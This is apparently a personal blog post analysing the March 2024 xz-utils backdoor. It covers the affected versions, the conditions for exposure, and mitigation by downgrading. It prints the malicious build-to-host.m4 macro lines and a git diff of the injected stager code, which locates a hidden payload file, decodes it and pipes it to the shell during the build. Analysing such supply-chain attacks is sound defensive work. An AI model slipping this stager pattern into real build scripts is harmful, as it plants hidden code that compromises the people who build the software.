---
title: "XZ Backdoor Found"
published: true
---

# Little in brief

```
Sorry guys i wasn't much active on the blog for a while due to some personal and more or less career related issues but now with new found clarity i would try to keep up and update blog as much as possible.
```

# Back on track

So on 29th March 2024, a backdoor was discovered in xz-utils basically a suite of software for lossless compression. This package was commonly used for compressing the tarballs, softwares packages, kernel images and initramfs images. It is widely distributed, statistically your average nix system will come with this package for convenience and lets be honest you machine won't work until you have these pacakges as kernel itself is genearlly itself is compressed using this utility.

This backdoor is very indirect and only shows up when a set of known specific criteria are met. Others might be there but there is no disclosure of them as of now (PS maybe i haven't found one). In the candour of this situation my understand is the it is at least triggerable by remote regular unpriviledged system connection to public SSH ports. This has been seen in the wild where it gets activated by connections - resulting in overall performance issues.

So are you affected answer is it depends, so in general what need to be true for your system to be vulnerable is as follows:

- System should be using glibc (for IFUNC).
- Version for xz or liblzma should be 5.6.0 or 5.6.1. Most likely to be found in rolling release.
- For people using .deb or .rpm with glibc and above mentioned xz version with systemd on publicly accessible ssh need to update as quickly as possible 


# XZ Outbreak History

Here is a map created by @FR0GGER_ AKA Thomas Roccia

![XZ Outbreak](https://pbs.twimg.com/media/GKSrPIxbMAA7myV.jpg)

One interesting part about this entire breakout was that how they used the build-to-host.m4

```m
gl_[$1]_config='sed \"r\n" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'

gl_path_map ='tr "\t \_ " " \t_\-"'
```

The m4 macro is executed during the build process and runs the malicious code.

Luckily for us most devices caught on early were ones using the rolling release so it was caught and patched for the most other distro it was recommended to revert back to previous safe and trusted versions of the xz-utility.


What is the design specific 
```diff
$ git diff m4/build-to-host.m4 ~/data/xz/xz-5.6.1/m4/build-to-host.m4
diff --git a/m4/build-to-host.m4 b/home/sam/data/xz/xz-5.6.1/m4/build-to-host.m4
index f928e9ab..d5ec3153 100644
--- a/m4/build-to-host.m4
+++ b/home/sam/data/xz/xz-5.6.1/m4/build-to-host.m4
@@ -1,4 +1,4 @@
-# build-to-host.m4 serial 3
+# build-to-host.m4 serial 30
 dnl Copyright (C) 2023-2024 Free Software Foundation, Inc.
 dnl This file is free software; the Free Software Foundation
 dnl gives unlimited permission to copy and/or distribute it,
@@ -37,6 +37,7 @@ AC_DEFUN([gl_BUILD_TO_HOST],
 
   dnl Define somedir_c.
   gl_final_[$1]="$[$1]"
+  gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
   dnl Translate it from build syntax to host syntax.
   case "$build_os" in
     cygwin*)
@@ -58,14 +59,40 @@ AC_DEFUN([gl_BUILD_TO_HOST],
   if test "$[$1]_c_make" = '\"'"${gl_final_[$1]}"'\"'; then
     [$1]_c_make='\"$([$1])\"'
   fi
+  if test "x$gl_am_configmake" != "x"; then
+    gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
+  else
+    gl_[$1]_config=''
+  fi
+  _LT_TAGDECL([], [gl_path_map], [2])dnl
+  _LT_TAGDECL([], [gl_[$1]_prefix], [2])dnl
+  _LT_TAGDECL([], [gl_am_configmake], [2])dnl
+  _LT_TAGDECL([], [[$1]_c_make], [2])dnl
+  _LT_TAGDECL([], [gl_[$1]_config], [2])dnl
   AC_SUBST([$1_c_make])
+
+  dnl If the host conversion code has been placed in $gl_config_gt,
+  dnl instead of duplicating it all over again into config.status,
+  dnl then we will have config.status run $gl_config_gt later, so it
+  dnl needs to know what name is stored there:
+  AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])
 ])
 
 dnl Some initializations for gl_BUILD_TO_HOST.
 AC_DEFUN([gl_BUILD_TO_HOST_INIT],
 [
+  dnl Search for Automake-defined pkg* macros, in the order
+  dnl listed in the Automake 1.10a+ documentation.
+  gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
+  if test -n "$gl_am_configmake"; then
+    HAVE_PKG_CONFIGMAKE=1
+  else
+    HAVE_PKG_CONFIGMAKE=0
+  fi
+
   gl_sed_double_backslashes='s/\\/\\\\/g'
   gl_sed_escape_doublequotes='s/"/\\"/g'
+  gl_path_map='tr "\t \-_" " \t_\-"'
 changequote(,)dnl
   gl_sed_escape_for_make_1="s,\\([ \"&'();<>\\\\\`|]\\),\\\\\\1,g"
 changequote([,])dnl
```


It is very interesting to see that such a well crafted package can lead to direct access to the user 

Hopefully most of the packages are now patched and updating the packages will resolve the issue.In cases where it is not downgrading is the best mitigation so downgrade to any version below 5.6.X recommended is 5.4.0.
